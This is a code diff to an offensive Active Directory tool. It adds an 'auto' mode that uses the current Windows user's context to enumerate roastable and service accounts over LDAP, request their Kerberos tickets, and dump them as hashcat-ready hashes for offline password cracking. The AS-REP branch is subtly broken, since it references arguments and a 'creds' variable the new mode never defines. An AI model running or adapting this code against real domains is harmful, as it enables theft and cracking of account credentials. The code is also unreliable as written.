@@ -67,6 +67,7 @@ def run():
 	ldap_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
 	ldap_group.add_argument('-f','--filter',  help='CUSTOM mode only. LDAP search filter')
 	ldap_group.add_argument('-a','--attrs', action='append', help='FULL and CUSTOM mode only. LDAP attributes to display')
+	ldap_group.add_argument('-s','--use-sspi', action='store_true', help='Use built-in windows SSPI for authentication. No credentials needed, will use the current user context.')
 
 	brute_group = subparsers.add_parser('brute', help='Enumerate users via brute-forcing kerberos service')
 	brute_group.add_argument('realm', help='Kerberos realm <COMPANY.corp>')
@@ -101,6 +102,10 @@ def run():
 	spnroastsspi_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
 	spnroastsspi_group.add_argument('-r','--realm', help='Kerberos realm <COMPANY.corp> This overrides realm specification got from the target file, if any')
 
+	auto_group = subparsers.add_parser('auto', help='Just get the tickets already. Only works on windows under any domain-user context')
+	auto_group.add_argument('dc_ip', help='Target domain controller')
+	auto_group.add_argument('-o','--out-file',  help='Output file base name, if omitted will print results to STDOUT')
+
 	args = parser.parse_args()
 
 	if args.verbose == 0:
@@ -120,7 +125,56 @@ def run():
 
 	#ksoc = KerberosSocket(args.target)
 	
-	if args.command == 'spnroast-sspi':
+	if args.command == 'auto':
+		try:
+			from winsspi.sspi import KerberoastSSPI
+		except ImportError:
+			raise Exception('winsspi module not installed!')
+			
+		target_server = MSLDAPTargetServer(args.dc_ip)
+		ldap = MSLDAP(None, target_server, use_sspi = True)
+		ldap.connect()
+		adinfo = ldap.get_ad_info()
+		domain = adinfo.distinguishedName.replace('DC=','').replace(',','.')
+		spn_users = []
+		asrep_users = []
+		results = []
+		for user in ldap.get_all_knoreq_user_objects():
+			cred = KerberosCredential()
+			cred.username = user.sAMAccountName
+			cred.domain = domain
+			
+			asrep_users.append(cred)
+		for user in ldap.get_all_service_user_objects():
+			cred = KerberosCredential()
+			cred.username = user.sAMAccountName
+			cred.domain = domain
+			
+			spn_users.append(cred)
+			
+		for cred in asrep_users:			
+			ks = KerberosSocket(args.address)
+			ar = APREPRoast(ks)
+			results += ar.run(creds, override_etype = [args.etype])
+
+		for cred in spn_users:
+			spn_name = '%s@%s' % (cred.username, cred.domain)
+			if spn_name[:6] == 'krbtgt':
+				continue
+			ksspi = KerberoastSSPI()
+			ticket = ksspi.get_ticket_for_spn(spn_name)
+			results.append(TGSTicket2hashcat(ticket))
+			
+		if args.out_file:
+			with open(args.out_file, 'w') as f:
+				for thash in results:
+					f.write(thash + '\r\n')
+		else:
+			for thash in results:
+				print(thash)
+		
+	
+	elif args.command == 'spnroast-sspi':
 		try:
 			from winsspi.sspi import KerberoastSSPI
 		except ImportError:
@@ -173,7 +227,6 @@ def run():
 		for spn_name in targets:
 			ksspi = KerberoastSSPI()
 			ticket = ksspi.get_ticket_for_spn(spn_name)
-			print(ticket)
 			results.append(TGSTicket2hashcat(ticket))
 			
 		if args.out_file:
@@ -403,7 +456,7 @@ def run():
 			password = getpass.getpass()
 		ldap_server = MSLDAPTargetServer(target)
 		creds = MSLDAPUserCredential(username = username, domain = domain, password = password, is_ntlm=args.ntlm)
-		ldap = MSLDAP(creds, ldap_server)
+		ldap = MSLDAP(creds, ldap_server, use_sspi = args.use_sspi)
 		ldap.connect()
 		adinfo = ldap.get_ad_info()
 		domain = adinfo.distinguishedName.replace('DC=','').replace(',','.')
@@ -450,7 +503,7 @@ def run():
 			ctr = 0
 			attrs = args.attrs if args.attrs is not None else MSADUser.TSV_ATTRS
 			if args.out_file:
-				with open(os.path.join(basefolder,basefile+'_ldap_users.tsv'), 'w', newline='') as f:
+				with open(os.path.join(basefolder,basefile+'_ldap_users.tsv'), 'w', newline='', encoding ='utf8') as f:
 					writer = csv.writer(f, delimiter = '\t')
 					writer.writerow(attrs)
 					for user in ldap.get_all_user_objects():
